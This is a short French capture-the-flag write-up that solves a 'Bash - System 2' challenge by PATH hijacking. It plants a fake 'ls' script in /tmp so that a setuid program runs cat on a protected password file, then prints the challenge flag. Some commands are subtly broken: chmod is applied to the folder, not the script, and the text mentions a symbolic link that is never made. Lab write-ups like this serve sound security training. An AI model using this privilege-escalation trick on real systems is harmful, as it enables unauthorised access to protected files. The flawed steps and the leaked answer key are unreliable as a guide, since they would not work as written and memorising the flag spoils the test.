# Bash - System 2

# Description : 

> Comme dans la première version de ce challenge (Bash System 1), le programme applique les ID utilisateur réels et effectifs du processus actuel à **app-script-ch12-cracked** (qui est aussi l'utilisateur capable de lire le fichier **.passwd**).
> Le programme exécute ensuite la commande `ls` sur le fichier **.passwd**.
> 
> La différence avec la première version est que, cette fois, il faut gérer la présence des paramètres positionnels **-lA**.

# Exploit : 

 
> Pour ce faire, il faut créer un nouveau dossier dans **/tmp**.
> 
> `mkdir -p /tmp/ch12-exploit`
> 
> Ensuite, il faut créer un nouveau fichier appelé `ls`. Ce fichier contiendra la commande `cat` à exécuter pour afficher le contenu de **.passwd**.
> 
> `echo \'/bin/cat /challenge/app-script/ch12/.passwd\' > /tmp/ch12-exploit/ls`
> 
> Il faut donner à ce fichier les droits d'exécution avec
> 
> `chmod +x /tmp/ch12-exploit`
> 
> Et enfin, il faut exporter le nouveau chemin dans la variable d'environnement *PATH*, afin que le lien symbolique puisse s'exécuter avant les programmes de base situés dans le répertoire **/usr/bin**.
> 
> `export PATH=/tmp/ch12-exploit`
> 
> Maintenant, il suffit de lancer le programme `./ch12` qui affichera le flag suivant : **8a95eDS/\*e_T#**